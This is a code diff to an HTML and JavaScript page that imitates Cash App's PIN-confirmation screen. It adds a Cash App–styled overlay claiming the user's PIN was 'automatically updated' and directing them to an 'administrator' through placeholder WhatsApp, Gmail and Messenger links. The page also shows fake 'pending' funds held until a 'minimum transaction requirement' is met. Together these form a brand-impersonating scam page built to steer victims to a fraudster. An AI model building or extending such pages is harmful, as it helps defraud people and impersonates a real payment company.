@@ -7,7 +7,6 @@
       content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
     />
     <title>Confirm PIN - Cash App</title>
-    <link rel="icon" href="favicon.svg" type="image/svg+xml" />
     <!-- Font Awesome -->
     <link
       rel="stylesheet"
@@ -338,6 +337,182 @@
           opacity: 1;
         }
       }
+      /* --- Cash App Themed Overlay Styles --- */
+      .cashapp-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(
+          0,
+          0,
+          0,
+          0.75
+        ); /* Darker, more immersive overlay */
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 2000; /* Ensure it's on top */
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity 0.3s cubic-bezier(0.25, 0.8, 0.25, 1),
+          visibility 0s linear 0.3s;
+      }
+
+      .cashapp-overlay.show {
+        opacity: 1;
+        visibility: visible;
+        transition-delay: 0s;
+      }
+
+      .cashapp-overlay-content {
+        background-color: #ffffff; /* White content box */
+        padding: 30px 35px;
+        border-radius: 20px; /* Cash App often uses generous border radii */
+        text-align: center;
+        width: 90%;
+        max-width: 360px; /* Constrain width on larger screens */
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        transform: translateY(20px) scale(0.95);
+        transition: transform 0.3s cubic-bezier(0.25, 0.8, 0.25, 1),
+          opacity 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+      }
+
+      .cashapp-overlay.show .cashapp-overlay-content {
+        transform: translateY(0) scale(1);
+      }
+
+      .cashapp-icon-container {
+        margin-bottom: 18px;
+      }
+
+      .cashapp-icon-container svg {
+        width: 60px;
+        height: 60px;
+        color: #00d632; /* Cash App Green */
+      }
+
+      .cashapp-overlay-title {
+        font-size: 24px; /* Slightly larger title */
+        font-weight: 700; /* Bolder title */
+        color: #000000;
+        margin-top: 0;
+        margin-bottom: 15px;
+      }
+
+      .cashapp-overlay-message,
+      .cashapp-overlay-instruction {
+        font-size: 16px;
+        color: #333333; /* Dark grey for text, not full black */
+        line-height: 1.5;
+        margin-bottom: 12px;
+      }
+
+      .cashapp-overlay-instruction {
+        margin-top: 20px;
+        margin-bottom: 20px;
+        font-weight: 500;
+      }
+
+      .admin-contact-info {
+        margin-top: 25px;
+        margin-bottom: 30px;
+        text-align: left;
+        font-size: 15px;
+      }
+
+      .admin-contact-info p {
+        margin-bottom: 15px;
+        display: flex;
+        justify-content: space-between; /* Pushes link to the right */
+        align-items: center;
+      }
+
+      .admin-contact-info strong {
+        color: #000000;
+        font-weight: 600; /* Stronger label */
+        margin-right: 10px;
+      }
+
+      .contact-link {
+        color: #0085ff; /* A vivid blue for links, common in apps */
+        text-decoration: none;
+        font-weight: 500;
+        padding: 5px 0; /* Make link easier to tap */
+        transition: color 0.2s ease;
+      }
+      .contact-link:hover,
+      .contact-link:focus {
+        color: #005fcc;
+        text-decoration: underline;
+      }
+
+      .cashapp-button {
+        background-color: #00d632; /* Cash App Green */
+        color: #ffffff; /* White text */
+        border: none;
+        padding: 16px 20px; /* Generous padding */
+        font-size: 17px; /* Larger button text */
+        font-weight: 600; /* Bold button text */
+        border-radius: 12px; /* Rounded button */
+        cursor: pointer;
+        width: 100%;
+        transition: background-color 0.2s ease, transform 0.1s ease;
+        margin-top: 10px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+
+      .cashapp-button:hover {
+        background-color: #00b82a; /* Darker green on hover */
+      }
+      .cashapp-button:active {
+        background-color: #00a325; /* Even darker on active/press */
+        transform: scale(0.98);
+      }
+      /* --- Cash App Themed Overlay Styles --- */
+      /* ... (all other .cashapp-overlay styles from the previous response remain the same) ... */
+
+      .cashapp-icon-container {
+        margin-bottom: 20px; /* Adjusted margin slightly */
+      }
+
+      /* UPDATED: Style for the Font Awesome icon */
+      .cashapp-icon-container i {
+        font-size: 50px; /* Adjust size as needed for the Font Awesome icon */
+        color: #00d632; /* Cash App Green */
+        line-height: 1; /* Helps with vertical alignment of font icons */
+      }
+
+      .cashapp-overlay-title {
+        font-size: 22px; /* Slightly adjusted for balance with new text */
+        font-weight: 700;
+        color: #000000;
+        margin-top: 0;
+        margin-bottom: 12px;
+      }
+
+      .cashapp-overlay-message {
+        font-size: 16px;
+        color: #333333;
+        line-height: 1.6;
+        margin-bottom: 8px;
+      }
+
+      .cashapp-overlay-instruction {
+        font-size: 16px;
+        color: #333333;
+        line-height: 1.6;
+        margin-bottom: 25px; /* Increased space before contact info */
+        font-weight: 500;
+      }
+
+      /* Make sure existing .pin-dot.filled also uses Cash App Green if desired */
+      /* Example (you might already have this or similar):
+.pin-dot.filled {
+    background-color: #00D632;
+}
+*/
     </style>
   </head>
   <body>
@@ -419,6 +594,67 @@
         </div>
       </div>
     </div>
+
+    <!-- UPDATED: PIN Changed Overlay -->
+    <div id="pin-changed-overlay" class="cashapp-overlay">
+      <div class="cashapp-overlay-content">
+        <div class="cashapp-icon-container">
+          <!-- Font Awesome Icon - Make sure Font Awesome is linked in your project (see reminder above) -->
+          <i class="fas fa-shield-alt"></i>
+          <!-- Using a shield icon for security -->
+        </div>
+        <h2 class="cashapp-overlay-title">Important: PIN Updated</h2>
+        <p class="cashapp-overlay-message">
+          For security reasons, your account PIN has been automatically updated.
+        </p>
+        <p class="cashapp-overlay-instruction">
+          To obtain your new PIN and continue, please contact the administrator:
+        </p>
+
+        <div class="admin-contact-info">
+          <p>
+            <strong>WhatsApp:</strong>
+            <!-- 
+                  IMPORTANT: Replace YOUR_WHATSAPP_NUMBER_HERE with your actual WhatsApp number 
+                  (e.g., 14155552671 for +1 415-555-2671). No '+' or other symbols.
+                -->
+            <a
+              href="https://wa.me/YOUR_WHATSAPP_NUMBER_HERE"
+              target="_blank"
+              class="contact-link"
+              >Message Admin</a
+            >
+          </p>
+          <p>
+            <strong>Gmail:</strong>
+            <!-- 
+                  IMPORTANT: Replace YOUR_GMAIL_ADDRESS_HERE with your actual Gmail address 
+                  (e.g., your.email@gmail.com).
+                -->
+            <a
+              href="mailto:YOUR_GMAIL_ADDRESS_HERE"
+              target="_blank"
+              class="contact-link"
+              >Email Admin</a
+            >
+          </p>
+          <p>
+            <strong>Messenger:</strong>
+            <!-- 
+                  IMPORTANT: Replace YOUR_MESSENGER_PROFILE_LINK_HERE with your Facebook username or page ID 
+                  (e.g., for m.me/john.doe, use "john.doe").
+                -->
+            <a
+              href="https://m.me/YOUR_MESSENGER_PROFILE_LINK_HERE"
+              target="_blank"
+              class="contact-link"
+              >Message Admin</a
+            >
+          </p>
+        </div>
+        <button id="pin-changed-ok-btn" class="cashapp-button">OK</button>
+      </div>
+    </div>
     <!-- End app-container -->
 
     <script>
@@ -428,9 +664,9 @@
       const keypadEl = document.getElementById("pin-keypad");
       const closeBtn = document.getElementById("close-btn");
       const helpBtn = document.getElementById("help-btn");
-      // Result Overlay elements
+      // Result Overlay elements (existing)
       const resultOverlay = document.getElementById("success-overlay");
-      // Pending elements
+      // Pending elements (existing)
       const pendingAvatarContainer = document.getElementById("pending-avatar");
       const pendingCashtagEl = document.getElementById("pending-cashtag");
       const pendingMessage1El = document.getElementById("pending-message-1");
@@ -439,8 +675,8 @@
         "pending-amount-display"
       );
       const pendingDoneBtn = document.getElementById("pending-done-btn");
-      // Success elements
-      const successContent = resultOverlay.querySelector(".success-content"); // Target wrapper
+      // Success elements (existing)
+      const successContent = resultOverlay.querySelector(".success-content");
       const successIcon = resultOverlay.querySelector(".success-icon");
       const successMessageText = document.getElementById(
         "success-message-text"
@@ -450,14 +686,24 @@
       );
       const successDoneBtn = document.getElementById("success-done-btn");
 
+      // --- NEW: PIN Changed Overlay Elements ---
+      const pinChangedOverlay = document.getElementById("pin-changed-overlay");
+      const pinChangedOkBtn = document.getElementById("pin-changed-ok-btn");
+
       // --- State & Constants ---
       let currentPin = "";
       const PIN_LENGTH = 4;
-      const DEFAULT_PIN = "1234"; // The correct PIN
+      // const DEFAULT_PIN = "1234"; // This is no longer the primary way to check the PIN for payment.
+      // "1234" is now the trigger PIN for change.
       const localStorageBalanceKey = "cashAppBalance";
       const localStoragePaymentAmountKey = "pendingPaymentAmount";
-      const localStorageRecipientDataKey = "pendingRecipientData"; // Use object data key
+      const localStorageRecipientDataKey = "pendingRecipientData";
       const localStorageBalanceBeforeKey = "pendingBalanceBefore";
+
+      // --- NEW: Constants for PIN Change Logic ---
+      const TRIGGER_PIN_FOR_CHANGE = "1234"; // The PIN that triggers the change
+      const NEW_PIN_AFTER_CHANGE = "2222"; // The PIN it gets changed to
+      const localStorageActualPinKey = "cashAppActualPin"; // Key to store the *actual* current PIN for payments
 
       // --- Functions ---
 
@@ -488,7 +734,7 @@
         }, 400);
       }
 
-      // Show Pending/Result Screen
+      // Show Pending/Result Screen (original function, largely unchanged)
       function showResultScreen(isPending = true) {
         const amount =
           localStorage.getItem(localStoragePaymentAmountKey) || "0";
@@ -501,7 +747,7 @@
           avatar: null,
           initial: "R",
           color: "#0052FF",
-        }; // Default structure
+        };
 
         try {
           if (recipientDataString) {
@@ -517,7 +763,7 @@
                   .substring(0, 12);
             if (!recipient.initial && recipient.name)
               recipient.initial = recipient.name.charAt(0).toUpperCase();
-            if (!recipient.color) recipient.color = "#0052FF"; // Ensure color default if missing
+            if (!recipient.color) recipient.color = "#0052FF";
           }
         } catch (e) {
           console.error("Error parsing recipient data:", e);
@@ -526,16 +772,14 @@
         const formattedAmount = formatAmount(amount);
         const recipientCashtag = recipient.cashtag;
 
-        if (pendingAvatarContainer) pendingAvatarContainer.innerHTML = ""; // Clear previous content
+        if (pendingAvatarContainer) pendingAvatarContainer.innerHTML = "";
 
         if (isPending) {
-          // Conditional Avatar Rendering
           if (recipient.avatar && pendingAvatarContainer) {
             const img = document.createElement("img");
             img.src = recipient.avatar;
             img.alt = recipient.name;
             img.onerror = () => {
-              // Fallback for broken image link
               console.warn(
                 "Recipient avatar image failed to load, showing initial."
               );
@@ -543,22 +787,19 @@
               const initialSpan = document.createElement("span");
               initialSpan.textContent = recipient.initial || "?";
               pendingAvatarContainer.appendChild(initialSpan);
-              pendingAvatarContainer.style.backgroundColor = recipient.color; // Use specific or default color
+              pendingAvatarContainer.style.backgroundColor = recipient.color;
             };
             pendingAvatarContainer.appendChild(img);
-            pendingAvatarContainer.style.backgroundColor = "transparent"; // Clear bg for image
+            pendingAvatarContainer.style.backgroundColor = "transparent";
           } else if (pendingAvatarContainer) {
-            // Use Initial
             const initialSpan = document.createElement("span");
             initialSpan.textContent = recipient.initial || "?";
             pendingAvatarContainer.appendChild(initialSpan);
-            pendingAvatarContainer.style.backgroundColor = recipient.color; // Use specific or default blue
+            pendingAvatarContainer.style.backgroundColor = recipient.color;
           }
 
-          // Populate other Pending Elements
           if (pendingCashtagEl) pendingCashtagEl.textContent = recipientCashtag;
-          // Dynamic pending messages
-          const requirementAmount = 50; // Example requirement
+          const requirementAmount = 50;
           const requirementFormatted = formatAmount(requirementAmount);
           if (pendingMessage1El)
             pendingMessage1El.textContent = `The funds have been sent, but will not be available until ${recipientCashtag} meets the minimum transaction requirement.`;
@@ -567,26 +808,56 @@
           if (pendingAmountDisplayEl)
             pendingAmountDisplayEl.textContent = formattedAmount;
 
-          resultOverlay.className = "success-overlay show state-pending"; // Set classes
+          resultOverlay.className = "success-overlay show state-pending";
         } else {
-          // Populate Success Elements (Fallback)
           if (successMessageText)
             successMessageText.textContent = "Payment Sent!";
           if (successDetailsText)
             successDetailsText.textContent = `You sent ${formattedAmount} to ${recipient.name}`;
-          resultOverlay.className = "success-overlay show state-success"; // Set classes
+          resultOverlay.className = "success-overlay show state-success";
         }
 
-        // Clear pending payment info AFTER populating the screen
         localStorage.removeItem(localStoragePaymentAmountKey);
         localStorage.removeItem(localStorageRecipientDataKey);
         localStorage.removeItem(localStorageBalanceBeforeKey);
       }
 
-      // Inside checkPin function in pin_confirm.html
+      // --- NEW: Function to show the PIN Changed Overlay ---
+      function showPinChangedOverlay() {
+        if (pinChangedOverlay) {
+          // Make sure other overlays are hidden
+          if (resultOverlay) {
+            resultOverlay.classList.remove("show");
+            resultOverlay.classList.remove("state-pending");
+            resultOverlay.classList.remove("state-success");
+          }
+          pinChangedOverlay.classList.add("show");
+        }
+      }
+
+      // --- MODIFIED: checkPin function ---
       function checkPin() {
-        if (currentPin === DEFAULT_PIN) {
-          console.log("PIN Correct!");
+        let activePinForPayment = localStorage.getItem(
+          localStorageActualPinKey
+        );
+        // Fallback if not set during DOMContentLoaded (should not happen normally)
+        if (!activePinForPayment) {
+          activePinForPayment = TRIGGER_PIN_FOR_CHANGE; // Initial default PIN
+          localStorage.setItem(localStorageActualPinKey, activePinForPayment);
+        }
+
+        if (currentPin === TRIGGER_PIN_FOR_CHANGE) {
+          // User entered the specific PIN "1234" to trigger a change
+          localStorage.setItem(localStorageActualPinKey, NEW_PIN_AFTER_CHANGE); // Change active PIN to "2222"
+          console.log(
+            `PIN change triggered. Active PIN set to ${NEW_PIN_AFTER_CHANGE}.`
+          );
+          showPinChangedOverlay(); // Show the "PIN has been changed" overlay
+          resetPinInput(); // Clear the entered PIN from dots
+          // Do NOT proceed with payment logic here
+        } else if (currentPin === activePinForPayment) {
+          // User entered the correct current PIN for payment (which might be "2222" or other)
+          console.log("PIN Correct for payment!");
           const paymentAmountStr = localStorage.getItem(
             localStoragePaymentAmountKey
           );
@@ -620,16 +891,8 @@
             const newBalance = balanceBefore - paymentAmount;
             localStorage.setItem(localStorageBalanceKey, newBalance.toString()); // Update the main balance
             console.log(`Balance updated in storage: ${newBalance}`);
-
-            // **Navigate to the new payment_result.html**
-            // The necessary data (pendingPaymentAmount, pendingRecipientData)
-            // is already in localStorage for payment_result.html to pick up.
-            // The pendingPaymentNote should also have been saved by contact_pay.html
             console.log("PIN success, navigating to payment result page.");
-            window.location.href = "payment_result.html";
-
-            // The old showResultScreen(true) from pin_confirm.html is no longer called here.
-            // The result display logic is now entirely within payment_result.html.
+            window.location.href = "payment_result.html"; // Navigate to payment result
           } else {
             console.error(
               "Error finalizing payment post-PIN: Invalid amount or insufficient funds."
@@ -638,12 +901,14 @@
             resetPinInput(); // Allow PIN retry
           }
         } else {
+          // Incorrect PIN entered
           console.log("PIN Incorrect!");
           triggerShakeAnimation();
           setTimeout(resetPinInput, 500);
         }
       }
-      // Handle keypad presses
+
+      // Handle keypad presses (original function, unchanged)
       function handleKeyPress(value) {
         if (value === "<") {
           currentPin = currentPin.slice(0, -1);
@@ -652,31 +917,39 @@
         }
         updatePinDots();
         if (currentPin.length === PIN_LENGTH) {
-          setTimeout(checkPin, 150);
+          setTimeout(checkPin, 150); // checkPin will now use the new logic
         }
       }
 
       // --- Event Listeners ---
-      keypadEl.addEventListener("click", (event) => {
-        const target = event.target.closest("button");
-        if (target && target.dataset.value) {
-          handleKeyPress(target.dataset.value);
-        }
-      });
+      if (keypadEl) {
+        keypadEl.addEventListener("click", (event) => {
+          const target = event.target.closest("button");
+          if (target && target.dataset.value) {
+            handleKeyPress(target.dataset.value);
+          }
+        });
+      }
 
-      closeBtn.addEventListener("click", () => {
-        localStorage.removeItem(localStoragePaymentAmountKey);
-        localStorage.removeItem(localStorageRecipientDataKey);
-        localStorage.removeItem(localStorageBalanceBeforeKey);
-        console.log("PIN entry cancelled.");
-        window.history.back();
-      });
+      if (closeBtn) {
+        closeBtn.addEventListener("click", () => {
+          localStorage.removeItem(localStoragePaymentAmountKey);
+          localStorage.removeItem(localStorageRecipientDataKey);
+          localStorage.removeItem(localStorageBalanceBeforeKey);
+          console.log("PIN entry cancelled.");
+          // Also hide PIN changed overlay if it's visible
+          if (pinChangedOverlay) pinChangedOverlay.classList.remove("show");
+          window.history.back();
+        });
+      }
 
-      helpBtn.addEventListener("click", () => {
-        alert("Help / Forgot PIN (Not Implemented)");
-      });
+      if (helpBtn) {
+        helpBtn.addEventListener("click", () => {
+          alert("Help / Forgot PIN (Not Implemented)");
+        });
+      }
 
-      // Combined 'Done'/'OK' button listener
+      // Combined 'Done'/'OK' button listener for original overlays
       if (pendingDoneBtn)
         pendingDoneBtn.addEventListener("click", () => {
           window.location.href = "history.html";
@@ -686,18 +959,56 @@
           window.location.href = "history.html";
         });
 
+      // --- NEW: Event Listener for the PIN Changed Overlay OK Button ---
+      if (pinChangedOkBtn) {
+        pinChangedOkBtn.addEventListener("click", () => {
+          if (pinChangedOverlay) {
+            pinChangedOverlay.classList.remove("show");
+          }
+          resetPinInput(); // Clear PIN dots
+          // You might want to redirect to a specific page, e.g., home or settings
+          // window.location.href = "index.html"; // Or wherever appropriate
+        });
+      }
+
       // --- Initial Load ---
       document.addEventListener("DOMContentLoaded", () => {
         updatePinDots();
+
+        // --- NEW: Initialize the actual PIN if not already set in localStorage ---
+        if (!localStorage.getItem(localStorageActualPinKey)) {
+          // Set the initial active PIN to "1234"
+          localStorage.setItem(
+            localStorageActualPinKey,
+            TRIGGER_PIN_FOR_CHANGE
+          );
+          console.log(`Initial active PIN set to: ${TRIGGER_PIN_FOR_CHANGE}`);
+        }
+
+        // Check for pending payment data (original logic)
         if (
           !localStorage.getItem(localStoragePaymentAmountKey) ||
           !localStorage.getItem(localStorageRecipientDataKey)
         ) {
-          console.warn("Missing pending payment data. Redirecting back.");
-          window.location.replace("contact_pay.html"); // Redirect if missing data
+          // This check might be too aggressive if the PIN page can be accessed without a pending payment
+          // (e.g., for just changing PIN). For now, keeping original behavior.
+          // If this page is SOLELY for payment confirmation, this is fine.
+          // If it could be for general PIN actions, this redirect might need to be conditional.
+          const onPinConfirmPage =
+            window.location.pathname.includes("pin_confirm.html"); // Adjust if your page name is different
+          const paymentRelatedKeysExist =
+            localStorage.getItem(localStoragePaymentAmountKey) ||
+            localStorage.getItem(localStorageRecipientDataKey);
+
+          if (
+            onPinConfirmPage &&
+            !paymentRelatedKeysExist &&
+            !pinChangedOverlay.classList.contains("show")
+          ) {
+            window.location.replace("contact_pay.html");
+          }
         }
       });
     </script>
-    <script src="activity.js"></script>
   </body>
 </html>
